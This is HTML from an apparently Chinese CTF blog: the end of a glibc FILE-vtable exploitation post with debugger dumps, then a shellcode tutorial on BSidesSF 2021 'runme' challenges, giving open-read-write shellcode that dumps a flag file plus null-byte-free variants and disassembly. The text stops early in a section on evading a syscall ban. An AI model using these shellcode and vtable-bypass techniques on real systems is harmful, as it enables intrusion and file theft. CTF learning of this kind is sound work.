&lt;_IO_wide_data_0&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>看一下buf里面的内容</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x7ffff7dd2740</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2740</span> &lt;buf&gt;:\t<span class=\"number\">0x000a434343434343</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2750</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2760</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2770</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2780</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2790</span> &lt;ttyname_buf&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27a0</span> &lt;getmntent_buffer&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27b0</span> &lt;qfcvt_bufptr&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27c0</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27d0</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27e0</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd27f0</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2800</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2810</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2820</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd2830</span> &lt;<span class=\"built_in\">buffer</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"IO-str-jumps-gt-overflow\"><a href=\"#IO-str-jumps-gt-overflow\" class=\"headerlink\" title=\"_IO_str_jumps -&gt; overflow\"></a>_IO_str_jumps -&gt; overflow</h2><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_str_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class=\"line\">  JUMP_INIT(<span class=\"built_in\">overflow</span>, _IO_str_overflow),</span><br><span class=\"line\">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class=\"line\">  JUMP_INIT(<span class=\"built_in\">read</span>, _IO_default_read),</span><br><span class=\"line\">  JUMP_INIT(<span class=\"built_in\">write</span>, _IO_default_write),</span><br><span class=\"line\">  JUMP_INIT(<span class=\"built_in\">seek</span>, _IO_default_seek),</span><br><span class=\"line\">  JUMP_INIT(<span class=\"built_in\">close</span>, _IO_default_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"如何编写shellcode","url":"https://pz1o.top/2021/03/21/如何编写shellcode/","content":"<p>写这个主要是校赛出了一道题，来源于国外的一道题目</p>\n<p>具体的话可以看[这个][<a href=\"https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚\" target=\"_blank\" rel=\"noopener\">https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚</a></p>\n<h1 id=\"0x01-method\"><a href=\"#0x01-method\" class=\"headerlink\" title=\"0x01 method\"></a>0x01 method</h1><h2 id=\"nasm\"><a href=\"#nasm\" class=\"headerlink\" title=\"nasm\"></a>nasm</h2><p>首先我们需要这个nasm东西</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whereis nasm</span><br><span class=\"line\">&#x2F;&#x2F;如果没有，直接</span><br><span class=\"line\">sudo apt-get install nasm</span><br></pre></td></tr></table></figure>\n<p>接下来我们来编译一个汇编文件</p>\n<p>具体内容如下，其实就是输出hello,world</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; hello.asm </span><br><span class=\"line\">section .data            ; 数据段声明</span><br><span class=\"line\">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class=\"line\">        len equ $ - msg                 ; 字串长度</span><br><span class=\"line\">section .text            ; 代码段声明</span><br><span class=\"line\">global main            ; 指定入口函数</span><br><span class=\"line\">main:                  ; 在屏幕上显示一个字符串</span><br><span class=\"line\">        mov edx, len     ; 参数三：字符串长度</span><br><span class=\"line\">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class=\"line\">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class=\"line\">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class=\"line\">        int 0x80         ; 调用内核功能</span><br><span class=\"line\">                         ; 退出程序</span><br><span class=\"line\">        mov ebx, 0       ; 参数一：退出代码</span><br><span class=\"line\">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class=\"line\">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nasm -f elf32 hello.asm -o hello.o</span><br><span class=\"line\">&#x2F;&#x2F;nasm -f [输出文件格式] [源文件] -o [目标文件]</span><br><span class=\"line\">gcc -m32 hello.o -o hello</span><br></pre></td></tr></table></figure>\n<p>应该可以看到运行出了hello,world，其实我们也就是从汇编然后编译执行了一个程序</p>\n<p>但我们如何查看其中十六进制数据呢？</p>\n<p>当然有多种方法</p>\n<p>比如objdump,objcopy等</p>\n<p>这里主要用一下objcopy</p>\n<p>具体每个工具用法可以自己去查，这里就不说了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objcopy -O binary hello.o code</span><br><span class=\"line\">xxd -i code</span><br></pre></td></tr></table></figure>\n<p>这样我们就生成了自己的shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;桌面$ xxd -i code</span><br><span class=\"line\">unsigned char code[] &#x3D; &#123;</span><br><span class=\"line\">  0xba, 0x0e, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x01,</span><br><span class=\"line\">  0x00, 0x00, 0x00, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xbb, 0x00,</span><br><span class=\"line\">  0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">unsigned int code_len &#x3D; 34;</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-challenge\"><a href=\"#0x02-challenge\" class=\"headerlink\" title=\"0x02 challenge\"></a>0x02 challenge</h1><p>这里总共分为三个challenge，主要是针对64位的</p>\n<p>也就是说我们参数在rdi rsi rdx中</p>\n<p>我们首先得要知道写shellcode目的是什么？</p>\n<p>在CTF中我们通常有两种一种就是拿到/bin/sh，另一种就是就是知道flag路径直接进行ORW</p>\n<p>先来看第一个挑战吧，这里原文作者都是用ORW(open read write)来做的，我们是来学东西的，也不必纠结那些东西。</p>\n<h2 id=\"runme1\"><a href=\"#runme1\" class=\"headerlink\" title=\"runme1\"></a>runme1</h2><p>先来看原作的第一个shellcode</p>\n<p>注释都已经很详细了</p>\n<p>就是很简单的ORW</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 2 ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  call getfilename ; Pushes the next address onto the stack and jumps down</span><br><span class=\"line\">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot;,0 ; The literal flag, null terminated</span><br><span class=\"line\">getfilename:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\">  mov rsi, 0 ; Flags &#x3D; 0</span><br><span class=\"line\">  mov rdx, 0 ; Mode &#x3D; 0</span><br><span class=\"line\">  syscall ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 0 ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  pop rdi ; Move the file handle into rdi</span><br><span class=\"line\">  pop rsi ; Use the same buffer where the filename pointer is stored (it&#39;s readable and writable)</span><br><span class=\"line\">  mov rdx, 30 ; rdx is the count</span><br><span class=\"line\">  syscall ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  mov rax, 1 ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  mov rdi, 1 ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\">  mov rdx, 30 ; rdx is the count again</span><br><span class=\"line\">  syscall ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  mov rax, 60 ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  mov rdi, 0 ; Exit with code 0</span><br><span class=\"line\">  syscall ; Perform an exit</span><br></pre></td></tr></table></figure>\n<h2 id=\"runme2\"><a href=\"#runme2\" class=\"headerlink\" title=\"runme2\"></a>runme2</h2><p>这个challenge加了限制条件，没有空字节</p>\n<p>先看一下第一个写的shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 1</span><br><span class=\"line\">00000000  B802000000        mov eax,0x2</span><br><span class=\"line\">00000005  E813000000        call qword 0x1d</span><br><span class=\"line\">0000000A  2F                db 0x2f</span><br><span class=\"line\">0000000B  686F6D652F        push qword 0x2f656d6f</span><br><span class=\"line\">00000010  63                db 0x63</span><br><span class=\"line\">00000011  7466              jz 0x79</span><br><span class=\"line\">00000013  2F                db 0x2f</span><br><span class=\"line\">00000014  666C              o16 insb</span><br><span class=\"line\">00000016  61                db 0x61</span><br><span class=\"line\">00000017  672E7478          cs jz 0x93</span><br><span class=\"line\">0000001B  7400              jz 0x1d</span><br><span class=\"line\">0000001D  5F                pop rdi</span><br><span class=\"line\">0000001E  BE00000000        mov esi,0x0</span><br><span class=\"line\">00000023  BA00000000        mov edx,0x0</span><br><span class=\"line\">00000028  0F05              syscall</span><br><span class=\"line\">0000002A  57                push rdi</span><br><span class=\"line\">0000002B  50                push rax</span><br><span class=\"line\">0000002C  B800000000        mov eax,0x0</span><br><span class=\"line\">00000031  5F                pop rdi</span><br><span class=\"line\">00000032  5E                pop rsi</span><br><span class=\"line\">00000033  BA1E000000        mov edx,0x1e</span><br><span class=\"line\">00000038  0F05              syscall</span><br><span class=\"line\">0000003A  B801000000        mov eax,0x1</span><br><span class=\"line\">0000003F  BF01000000        mov edi,0x1</span><br><span class=\"line\">00000044  BA1E000000        mov edx,0x1e</span><br><span class=\"line\">00000049  0F05              syscall</span><br><span class=\"line\">0000004B  B83C000000        mov eax,0x3c</span><br><span class=\"line\">00000050  BF00000000        mov edi,0x0</span><br><span class=\"line\">00000055  0F05              syscall</span><br></pre></td></tr></table></figure>\n<p>发现有很多0字节，这里要想不出现00字节该怎么办呢？</p>\n<p>我们首先得看到哪里有0字节</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000005  E813000000        call qword 0x1d</span><br><span class=\"line\">&#x2F;&#x2F;call A+0x13 &#x3D; call 0x1d</span><br></pre></td></tr></table></figure>\n<p>call中有很多00字节，这里可以用jmp替换</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000005  EB13              jmp short 0x1d</span><br></pre></td></tr></table></figure>\n<p>这里提到了一个calling backwards，主要就是调用上方代码。</p>\n<p>这里还有几个trick</p>\n<ol>\n<li>mov REG,0 ==&gt;xor REG,REG</li>\n<li>rax==&gt;al</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">;;; OPEN</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 2 &#x3D; sys_open</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 2</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; filename</span><br><span class=\"line\">  jmp short getfilename_bottom</span><br><span class=\"line\">getfilename_top:</span><br><span class=\"line\">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; flags</span><br><span class=\"line\">  xor rsi, rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; mode</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; READ</span><br><span class=\"line\"></span><br><span class=\"line\">  push rdi ; Temporarly store the filename pointer</span><br><span class=\"line\">  push rax ; Temporarily store the handle</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 0 &#x3D; sys_read</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdi &#x3D; file handle</span><br><span class=\"line\">  pop rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rsi &#x3D; buffer (same as filename)</span><br><span class=\"line\">  pop rsi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx &#x3D; count</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; WRITE</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Syscall 1 &#x3D; sys_write</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  inc rax</span><br><span class=\"line\"></span><br><span class=\"line\">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\">  inc rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; (rsi is already the buffer)</span><br><span class=\"line\"></span><br><span class=\"line\">  ; rdx is the count again</span><br><span class=\"line\">  xor rdx, rdx</span><br><span class=\"line\">  mov dl, 30</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">;;; EXIT</span><br><span class=\"line\">  ; Syscall 60 &#x3D; exit</span><br><span class=\"line\">  xor rax, rax</span><br><span class=\"line\">  mov al, 60</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Exit with code 0</span><br><span class=\"line\">  xor rdi, rdi</span><br><span class=\"line\"></span><br><span class=\"line\">  ; Perform an exit</span><br><span class=\"line\">  syscall</span><br><span class=\"line\"></span><br><span class=\"line\">getfilename_bottom:</span><br><span class=\"line\">  call getfilename_top</span><br><span class=\"line\"></span><br><span class=\"line\">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>\n<p>看一下这个，是没有00字节的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 a</span><br><span class=\"line\">00000000  4831C0            xor rax,rax</span><br><span class=\"line\">00000003  B002              mov al,0x2</span><br><span class=\"line\">00000005  EB34              jmp short 0x3b</span><br><span class=\"line\">00000007  5F                pop rdi</span><br><span class=\"line\">00000008  4831F6            xor rsi,rsi</span><br><span class=\"line\">0000000B  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000000E  0F05              syscall</span><br><span class=\"line\">00000010  57                push rdi</span><br><span class=\"line\">00000011  50                push rax</span><br><span class=\"line\">00000012  4831C0            xor rax,rax</span><br><span class=\"line\">00000015  5F                pop rdi</span><br><span class=\"line\">00000016  5E                pop rsi</span><br><span class=\"line\">00000017  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000001A  B21E              mov dl,0x1e</span><br><span class=\"line\">0000001C  0F05              syscall</span><br><span class=\"line\">0000001E  4831C0            xor rax,rax</span><br><span class=\"line\">00000021  48FFC0            inc rax</span><br><span class=\"line\">00000024  4831FF            xor rdi,rdi</span><br><span class=\"line\">00000027  48FFC7            inc rdi</span><br><span class=\"line\">0000002A  4831D2            xor rdx,rdx</span><br><span class=\"line\">0000002D  B21E              mov dl,0x1e</span><br><span class=\"line\">0000002F  0F05              syscall</span><br><span class=\"line\">00000031  4831C0            xor rax,rax</span><br><span class=\"line\">00000034  B03C              mov al,0x3c</span><br><span class=\"line\">00000036  4831FF            xor rdi,rdi</span><br><span class=\"line\">00000039  0F05              syscall</span><br><span class=\"line\">0000003B  E8C7FFFFFF        call qword 0x7</span><br><span class=\"line\">00000040  2F                db 0x2f</span><br><span class=\"line\">00000041  686F6D652F        push qword 0x2f656d6f</span><br><span class=\"line\">00000046  63                db 0x63</span><br><span class=\"line\">00000047  7466              jz 0xaf</span><br><span class=\"line\">00000049  2F                db 0x2f</span><br><span class=\"line\">0000004A  666C              o16 insb</span><br><span class=\"line\">0000004C  61                db 0x61</span><br><span class=\"line\">0000004D  672E7478          cs jz 0xc9</span><br><span class=\"line\">00000051  74                db 0x74</span><br></pre></td></tr></table></figure>\n<h2 id=\"runme3\"><a href=\"#runme3\" class=\"headerlink\" title=\"runme3\"></a>runme3</h2><p>这个直接把<code>syscall</code>ban了，那我们应该用什么呢？</p>\n<p>也就是<code>0f</code> <code>05</code></p>\n<p>这里的trick还是很有意思的，自己写一个编码器，那么我们来看一下如何实现吧？</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 